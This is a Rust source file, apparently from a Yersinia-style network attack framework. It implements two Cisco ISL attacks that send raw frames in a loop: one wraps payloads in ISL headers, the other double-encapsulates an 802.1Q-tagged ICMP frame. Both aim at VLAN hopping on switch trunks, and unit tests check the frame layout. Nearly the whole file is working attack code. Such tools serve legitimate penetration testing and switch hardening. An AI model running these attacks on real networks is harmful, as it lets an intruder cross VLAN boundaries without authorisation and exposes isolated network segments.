//! ISL Attack Implementations
//!
//! Implements various attacks for the ISL protocol including VLAN hopping
//! and frame spoofing attacks.

use async_trait::async_trait;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, MacAddr, Result};

use super::packet::IslFrame;

/// ISL Tagging Attack
///
/// This attack sends ISL-encapsulated frames to perform VLAN hopping on legacy ISL trunks.
/// It wraps regular Ethernet frames with ISL headers, allowing access to different VLANs
/// if the switch port is configured as an ISL trunk.
pub struct IslTaggingAttack {
    /// Target VLAN ID to access
    vlan_id: u16,
    /// Payload to encapsulate in ISL frame
    payload: Vec<u8>,
    /// Target MAC address
    _target_mac: MacAddr,
    /// Source MAC address
    src_mac: MacAddr,
    /// Interval between frames in milliseconds
    interval_ms: u64,
    /// Attack running flag
    running: Arc<AtomicBool>,
    /// Attack paused flag
    paused: Arc<AtomicBool>,
}

impl IslTaggingAttack {
    /// Create a new ISL tagging attack
    pub fn new(
        vlan_id: u16,
        payload: Vec<u8>,
        target_mac: MacAddr,
        src_mac: MacAddr,
        interval_ms: u64,
    ) -> Self {
        Self {
            vlan_id,
            payload,
            _target_mac: target_mac,
            src_mac,
            interval_ms,
            running: Arc::new(AtomicBool::new(true)),
            paused: Arc::new(AtomicBool::new(false)),
        }
    }
}

#[async_trait]
impl Attack for IslTaggingAttack {
    fn name(&self) -> &str {
        "ISL Tagging Attack"
    }

    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let mut interval = time::interval(Duration::from_millis(self.interval_ms));

        loop {
            interval.tick().await;

            // Check if we should stop
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            // Check if paused
            if ctx.paused.load(Ordering::Relaxed) {
                continue;
            }

            // Build ISL frame with our payload
            let isl_frame =
                IslFrame::new(self.vlan_id, self.payload.clone()).with_src_mac(self.src_mac);

            // Build complete frame
            let frame_bytes = isl_frame.build();

            // Send the frame
            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending ISL tagging frame: {}", e);
            } else {
                // Update stats
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }
        }

        Ok(())
    }

    fn pause(&self) {
        self.paused.store(true, Ordering::Relaxed);
    }

    fn resume(&self) {
        self.paused.store(false, Ordering::Relaxed);
    }

    fn stop(&self) {
        self.running.store(false, Ordering::Relaxed);
    }

    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
}

/// ISL Spoofing Attack
///
/// This attack performs double-encapsulation attacks by creating ISL frames that contain
/// another VLAN tag in the payload. This can be used for VLAN hopping when the outer
/// ISL header is stripped by the switch, revealing the inner VLAN tag.
///
/// Similar to double-tagging attacks with 802.1Q, but using ISL as the outer encapsulation.
pub struct IslSpoofingAttack {
    /// Inner VLAN ID (in the payload)
    inner_vlan: u16,
    /// Outer VLAN ID (in ISL header)
    outer_vlan: u16,
    /// Target MAC address
    target_mac: MacAddr,
    /// Source MAC address
    src_mac: MacAddr,
    /// Interval between frames in milliseconds
    interval_ms: u64,
    /// Attack running flag
    running: Arc<AtomicBool>,
    /// Attack paused flag
    paused: Arc<AtomicBool>,
}

impl IslSpoofingAttack {
    /// Create a new ISL spoofing attack
    pub fn new(
        inner_vlan: u16,
        outer_vlan: u16,
        target_mac: MacAddr,
        src_mac: MacAddr,
        interval_ms: u64,
    ) -> Self {
        Self {
            inner_vlan,
            outer_vlan,
            target_mac,
            src_mac,
            interval_ms,
            running: Arc::new(AtomicBool::new(true)),
            paused: Arc::new(AtomicBool::new(false)),
        }
    }

    /// Build an 802.1Q tagged Ethernet frame for the inner payload
    fn build_inner_payload(&self) -> Vec<u8> {
        let mut payload = Vec::new();

        // Ethernet header
        payload.extend_from_slice(&self.target_mac.0); // Destination MAC
        payload.extend_from_slice(&self.src_mac.0); // Source MAC

        // 802.1Q tag (4 bytes)
        payload.push(0x81); // TPID high byte
        payload.push(0x00); // TPID low byte
        payload.push((self.inner_vlan >> 8) as u8); // TCI high byte
        payload.push((self.inner_vlan & 0xFF) as u8); // TCI low byte

        // EtherType: IP (0x0800)
        payload.push(0x08);
        payload.push(0x00);

        // Dummy IP payload (minimal ICMP echo request)
        payload.extend_from_slice(&[
            0x45, 0x00, 0x00, 0x54, // IP header start
            0x00, 0x00, 0x40, 0x00, // ID, flags, fragment
            0x40, 0x01, 0x00, 0x00, // TTL, protocol (ICMP), checksum
            0x0A, 0x00, 0x00, 0x01, // Source IP
            0x0A, 0x00, 0x00, 0x02, // Dest IP
            0x08, 0x00, 0x00, 0x00, // ICMP type (echo), code, checksum
            0x00, 0x01, 0x00, 0x01, // ICMP ID, sequence
        ]);

        // Add some padding to meet minimum frame size
        while payload.len() < 64 {
            payload.push(0x00);
        }

        payload
    }
}

#[async_trait]
impl Attack for IslSpoofingAttack {
    fn name(&self) -> &str {
        "ISL Spoofing Attack"
    }

    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let mut interval = time::interval(Duration::from_millis(self.interval_ms));

        // Build the inner payload once (802.1Q tagged frame)
        let inner_payload = self.build_inner_payload();

        loop {
            interval.tick().await;

            // Check if we should stop
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            // Check if paused
            if ctx.paused.load(Ordering::Relaxed) {
                continue;
            }

            // Build ISL frame with outer VLAN, containing inner 802.1Q tagged frame
            let isl_frame =
                IslFrame::new(self.outer_vlan, inner_payload.clone()).with_src_mac(self.src_mac);

            // Build complete frame
            let frame_bytes = isl_frame.build();

            // Send the frame
            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending ISL spoofing frame: {}", e);
            } else {
                // Update stats
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }
        }

        Ok(())
    }

    fn pause(&self) {
        self.paused.store(true, Ordering::Relaxed);
    }

    fn resume(&self) {
        self.paused.store(false, Ordering::Relaxed);
    }

    fn stop(&self) {
        self.running.store(false, Ordering::Relaxed);
    }

    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_isl_tagging_attack_creation() {
        let payload = vec![0xAA; 64];
        let target_mac = MacAddr([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
        let src_mac = MacAddr([0x00, 0x11, 0x22, 0x33, 0x44, 0x55]);

        let attack = IslTaggingAttack::new(100, payload.clone(), target_mac, src_mac, 1000);

        assert_eq!(attack.name(), "ISL Tagging Attack");
        assert_eq!(attack.vlan_id, 100);
        assert_eq!(attack.payload, payload);
        assert_eq!(attack._target_mac, target_mac);
        assert_eq!(attack.src_mac, src_mac);
        assert_eq!(attack.interval_ms, 1000);
    }

    #[test]
    fn test_isl_spoofing_attack_creation() {
        let target_mac = MacAddr([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
        let src_mac = MacAddr([0x00, 0x11, 0x22, 0x33, 0x44, 0x55]);

        let attack = IslSpoofingAttack::new(10, 20, target_mac, src_mac, 500);

        assert_eq!(attack.name(), "ISL Spoofing Attack");
        assert_eq!(attack.inner_vlan, 10);
        assert_eq!(attack.outer_vlan, 20);
        assert_eq!(attack.target_mac, target_mac);
        assert_eq!(attack.src_mac, src_mac);
        assert_eq!(attack.interval_ms, 500);
    }

    #[test]
    fn test_isl_spoofing_inner_payload() {
        let target_mac = MacAddr([0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]);
        let src_mac = MacAddr([0x11, 0x22, 0x33, 0x44, 0x55, 0x66]);

        let attack = IslSpoofingAttack::new(42, 100, target_mac, src_mac, 1000);

        let payload = attack.build_inner_payload();

        // Check minimum frame size
        assert!(payload.len() >= 64);

        // Check destination MAC
        assert_eq!(&payload[0..6], &target_mac.0);

        // Check source MAC
        assert_eq!(&payload[6..12], &src_mac.0);

        // Check 802.1Q TPID (0x8100)
        assert_eq!(payload[12], 0x81);
        assert_eq!(payload[13], 0x00);

        // Check VLAN ID (42)
        let vlan_id = u16::from_be_bytes([payload[14], payload[15]]) & 0x0FFF;
        assert_eq!(vlan_id, 42);

        // Check EtherType (0x0800 = IP)
        assert_eq!(payload[16], 0x08);
        assert_eq!(payload[17], 0x00);
    }

    #[test]
    fn test_attack_metadata_tagging() {
        let attack = IslTaggingAttack::new(1, vec![], MacAddr([0; 6]), MacAddr([0; 6]), 1000);

        assert_eq!(attack.name(), "ISL Tagging Attack");
    }

    #[test]
    fn test_attack_metadata_spoofing() {
        let attack = IslSpoofingAttack::new(1, 2, MacAddr([0; 6]), MacAddr([0; 6]), 1000);

        assert_eq!(attack.name(), "ISL Spoofing Attack");
    }
}
